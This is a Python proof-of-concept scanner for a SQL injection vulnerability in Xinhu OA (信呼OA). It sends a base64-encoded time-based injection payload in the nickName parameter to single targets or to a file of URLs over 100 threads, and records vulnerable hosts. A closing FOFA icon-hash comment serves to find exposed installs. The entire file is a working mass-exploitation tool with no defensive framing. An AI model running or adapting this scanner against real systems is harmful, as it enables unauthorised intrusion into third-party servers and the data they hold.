import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """信呼OA系统index存在sql注入漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='信呼OA系统index存在sql注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw=="
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/121.0.0.0Safari/537.36",
    }
    try:
        response = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        if response.status_code == 200 and "success" in response.text:
            print(f"[+]{target}存在sql注入漏洞")
            with open('信呼_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target}不存在sql注入漏洞")
    except:
        print(f"[x]{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()

#fofa
# icon_hash="1652488516"